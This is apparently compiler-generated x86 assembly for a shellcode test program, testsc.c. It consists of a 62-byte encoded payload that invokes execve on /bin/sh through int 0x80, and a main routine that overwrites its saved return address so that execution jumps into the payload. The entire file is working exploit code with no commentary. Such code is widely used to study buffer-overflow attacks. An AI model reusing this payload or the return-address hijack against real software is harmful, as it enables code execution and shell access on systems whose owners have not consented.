	.file	"testsc.c"
.globl shellcode
	.data
	.align 32
	.type	shellcode,@object
	.size	shellcode,62
shellcode:
	.string	"\353*^\211v\b\306F\007"
	.string	"\307F\f"
	.string	""
	.string	""
	.string	""
	.string	"\270\013"
	.string	""
	.string	""
	.string	"\211\363\215N\b\215V\f\315\200\270\001"
	.string	""
	.string	""
	.string	"\273"
	.string	""
	.string	""
	.string	""
	.string	"\315\200\350\321\377\377\377/bin/sh"
	.string	"\211\354]\303"
	.text
.globl main
	.type	main,@function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$8, %esp
	andl	$-16, %esp
	movl	$0, %eax
	subl	%eax, %esp
	leal	-4(%ebp), %eax
	addl	$8, %eax
	movl	%eax, -4(%ebp)
	movl	-4(%ebp), %eax
	movl	$shellcode, (%eax)
	leave
	ret
.Lfe1:
	.size	main,.Lfe1-main
	.ident	"GCC: (GNU) 3.2.2 20030222 (Red Hat Linux 3.2.2-5)"
